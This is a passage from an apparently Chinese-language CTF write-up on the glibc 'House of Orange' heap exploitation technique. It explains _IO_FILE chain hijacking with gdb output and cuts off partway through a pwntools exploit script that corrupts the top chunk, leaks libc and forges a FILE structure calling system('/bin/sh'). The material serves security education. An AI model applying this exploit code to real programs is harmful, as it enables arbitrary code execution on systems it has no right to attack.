_fileno;<span class="comment">//这个就是linux内核中文件描述符fd  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0  </span></span><br><span class="line">  <span class="keyword">int</span> _blksize;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line">  <span class="keyword">int</span> _flags2;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span>  </span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;  </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;  </span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];  </span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span>  </span><br><span class="line">  _IO_lock_t *_lock;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE  </span></span><br><span class="line">&#125;;  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  _IO_FILE file;  </span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span><span class="comment">//IO函数跳转表  </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>我们注意到，这里 <code>struct _IO_FILE *_chain;  </code></p>
<p>_IO_File 是个文件结构体，<code>_chain</code> 指向了下一个结构体，如果我们能控制 chain 指向 heap buffer ，我们就能构造一个完整的file struct ，那么此刻要解决的问题就是如何控制 chain 指向 heap buufer 呢？</p>
<p>我们此刻知道， chain 在 file struct的offset 为0x68</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;((struct _IO_FILE*)0)-&gt;_chain</span><br><span class="line"><span class="variable">$13</span> = (struct _IO_FILE **) 0x68</span><br></pre></td></tr></table></figure>



<p>Unsortbin  位于bin[1] 后面的的62个bin 均为 smallbin</p>
<p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p>
<table>
<thead>
<tr>
<th>下标</th>
<th>SIZE_SZ=4（32 位）</th>
<th>SIZE_SZ=8（64 位）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>16</td>
<td>32</td>
</tr>
<tr>
<td>3</td>
<td>24</td>
<td>48</td>
</tr>
<tr>
<td>4</td>
<td>32</td>
<td>64</td>
</tr>
<tr>
<td>5</td>
<td>40</td>
<td>80</td>
</tr>
<tr>
<td>x</td>
<td>2<em>4</em>x</td>
<td>2<em>8</em>x</td>
</tr>
<tr>
<td>63</td>
<td>504</td>
<td>1008</td>
</tr>
</tbody></table>
<p>此时 offset = 0x68 在 bin[4]</p>
<p><code>fp-&gt;_chain = fp+0x68 = unsorted_bin + 0x68</code></p>
<p><code>bins[2-6]</code>都是<code>smallbins</code>的范围，大小为0x20,0x30,0x40,0x50,0x60。所以为了让<code>fp</code>指向我们指定的位置，就需要让<code>bins[6]</code>即0x60的<code>smallbin</code>是我们控制的。<br>那么现在<code>unsorted bin</code>中存在唯一的<code>chunk</code>为<code>top</code>，我们将它的大小改为<code>0x61</code>（因为<code>unsorted bin</code>中必然是空闲的，所以其前一个必然在使用中），那么当其加入<code>smallbin</code>中就会加入到<code>bins[6]</code>，这样就能实现<code>fp=top</code>也就是我们控制的位置了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55555577a010 (size : 0x20ff0)</span><br><span class="line">       last_remainder: 0x555555758570 (size : 0x60)</span><br><span class="line">            unsortbin: 0x555555758570 (size : 0x60)</span><br><span class="line">(0x060)  smallbin[ 4]: 0x555555758570 (overlap chunk with 0x555555758570(freed) )</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>



<p>此时 </p>
<p>fp—&gt; chain—&gt; 0x555555758570</p>
<p>如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fp <span class="number">0x2aaaab097b78</span></span><br><span class="line">$<span class="number">18</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x5577a010</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x555555758570</span> <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x555555758570</span> <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x2aaaab098510</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x2aaaab097b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">&quot;p\205uUUU&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x2aaaab097b88</span> &lt;main_arena+<span class="number">104</span>&gt; <span class="string">&quot;p\205uUUU&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x2aaaab097b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">&quot;\210&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x2aaaab097b98</span> &lt;main_arena+<span class="number">120</span>&gt; <span class="string">&quot;\210&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x2aaaab097ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">&quot;\230&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x2aaaab097ba8</span> &lt;main_arena+<span class="number">136</span>&gt; <span class="string">&quot;\230&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x2aaaab097bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">&quot;\250&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x2aaaab097bb8</span> &lt;main_arena+<span class="number">152</span>&gt; <span class="string">&quot;\250&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _markers = <span class="number">0x555555758570</span>,</span><br><span class="line">    _chain = <span class="number">0x555555758570</span>,</span><br><span class="line">    _fileno = <span class="number">0xab097bd8</span>,</span><br><span class="line">    _flags2 = <span class="number">0x2aaa</span>,</span><br><span class="line">    _old_offset = <span class="number">0x2aaaab097bd8</span>,</span><br><span class="line">    _cur_column = <span class="number">0x7be8</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x9</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\253&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x2aaaab097be8</span> &lt;main_arena+<span class="number">200</span>&gt;,</span><br><span class="line">    _offset = <span class="number">0x2aaaab097bf8</span>,</span><br><span class="line">    _codecvt = <span class="number">0x2aaaab097bf8</span> &lt;main_arena+<span class="number">216</span>&gt;,</span><br><span class="line">    _wide_data = <span class="number">0x2aaaab097c08</span> &lt;main_arena+<span class="number">232</span>&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x2aaaab097c08</span> &lt;main_arena+<span class="number">232</span>&gt;,</span><br><span class="line">    _freeres_buf = <span class="number">0x2aaaab097c18</span> &lt;main_arena+<span class="number">248</span>&gt;,</span><br><span class="line">    __pad5 = <span class="number">0x2aaaab097c18</span>,</span><br><span class="line">    _mode = <span class="number">0xab097c28</span>,</span><br><span class="line">    _unused2 = <span class="string">&quot;\252*\000\000(|\t\253\252*\000\000\070|\t\253\252*\000&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x2aaaab097c38</span> &lt;main_arena+<span class="number">280</span>&gt;</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ fp <span class="number">0x555555758570</span></span><br><span class="line">$<span class="number">19</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x6e69622f</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0x0</span>,</span><br><span class="line">    _flags2 = <span class="number">0x0</span>,</span><br><span class="line">    _old_offset = <span class="number">0x2aaaaad18390</span>,</span><br><span class="line">    _cur_column = <span class="number">0x0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x0</span>,</span><br><span class="line">    _offset = <span class="number">0x0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x555555758600</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x2</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x3</span>,</span><br><span class="line">    __pad5 = <span class="number">0x0</span>,</span><br><span class="line">    _mode = <span class="number">0xffffffff</span>,</span><br><span class="line">    _unused2 = <span class="string">&quot;\377\377\377\377&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">15</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x5555557585d0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>最后，我们还需要一些条件的bypass</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">…</span><br><span class="line">    fp = fp-&gt;_chain;</span><br><span class="line">    ...</span><br><span class="line">          <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)　　</span><br></pre></td></tr></table></figure>

<p>条件总结如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.fp-&gt;_mode &lt;= 0</span><br><span class="line">2.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">或</span><br><span class="line">1._IO_vtable_offset (fp) == 0</span><br><span class="line">2.fp-&gt;_mode &gt; 0</span><br><span class="line">3.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>

<p>这里可以选择第一种构造条件简单的进行构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange</span>(<span class="params">head_addr, system_addr, io_list_all</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload + p64(<span class="number">97</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">16</span>)</span><br><span class="line">    payload = payload + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) * <span class="number">9</span> + p64(system_addr) + p64(<span class="number">0</span></span><br><span class="line">        ) * <span class="number">4</span></span><br><span class="line">    payload = payload + p64(head_addr + <span class="number">18</span> * <span class="number">8</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0</span></span><br><span class="line">        ) + p64(<span class="number">18446744073709551615</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(head_addr + <span class="number">12</span> * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>



<p>构造结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fp <span class="number">0x555555758570</span></span><br><span class="line">$<span class="number">20</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0x6e69622f</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;,</span><br><span class="line">    _IO_read_end = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x2aaaab097bc8</span> &lt;main_arena+<span class="number">168</span>&gt; <span class="string">&quot;\270&#123;\t\253\252*&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0x0</span>,</span><br><span class="line">    _flags2 = <span class="number">0x0</span>,</span><br><span class="line">    _old_offset = <span class="number">0x2aaaaad18390</span>,</span><br><span class="line">    _cur_column = <span class="number">0x0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x0</span>,</span><br><span class="line">    _offset = <span class="number">0x0</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x555555758600</span>,</span><br><span class="line">    _freeres_list = <span class="number">0x2</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x3</span>,</span><br><span class="line">    __pad5 = <span class="number">0x0</span>,</span><br><span class="line">    _mode = <span class="number">0xffffffff</span>,</span><br><span class="line">    _unused2 = <span class="string">&quot;\377\377\377\377&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">15</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x5555557585d0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> swpwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&#x27;./houseoforange&#x27;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">io = process(binary, aslr = <span class="number">0</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.terminal = [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;notiterm.py&quot;</span>,<span class="string">&quot;-t&quot;</span>,<span class="string">&quot;iterm&quot;</span>,<span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">myu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">house_of_orange</span>(<span class="params">head_addr, system_addr, io_list_all</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload + p64(<span class="number">97</span>) + p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">16</span>)</span><br><span class="line">    payload = payload + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) * <span class="number">9</span> + p64(system_addr) + p64(<span class="number">0</span></span><br><span class="line">        ) * <span class="number">4</span></span><br><span class="line">    payload = payload + p64(head_addr + <span class="number">18</span> * <span class="number">8</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">0</span></span><br><span class="line">        ) + p64(<span class="number">18446744073709551615</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(head_addr + <span class="number">12</span> * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span>():</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">nm, length, pz, color</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(nm)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(pz))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span>(<span class="params">nm, length, pz, color</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.send(nm)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(pz))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"><span class="built_in">breakpoint</span> = [<span class="number">0x01415</span>,<span class="number">0x13FD</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">break *0x555555554000+0x01415</span></span><br><span class="line"><span class="string">break *0x555555554000+0x13FD </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">build(<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>, <span class="number">0x90</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;c&#x27;</span> * <span class="number">0x90</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>) + p32(<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0xf21</span>)</span><br><span class="line"><span class="comment"># overwrite the top chunk</span></span><br><span class="line">pause()</span><br><span class="line">upgrade(pay, <span class="built_in">len</span>(pay), <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger _int_free()</span></span><br><span class="line">build(<span class="string">&#x27;1&#x27;</span>, <span class="number">0x1000</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># build a large chunk</span></span><br><span class="line">build(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = myu64(io.recvn(<span class="number">6</span>)) &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + <span class="built_in">hex</span>(libc_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3bd000</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + <span class="built_in">hex</span>(libc.address) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap with fd_nextsize, 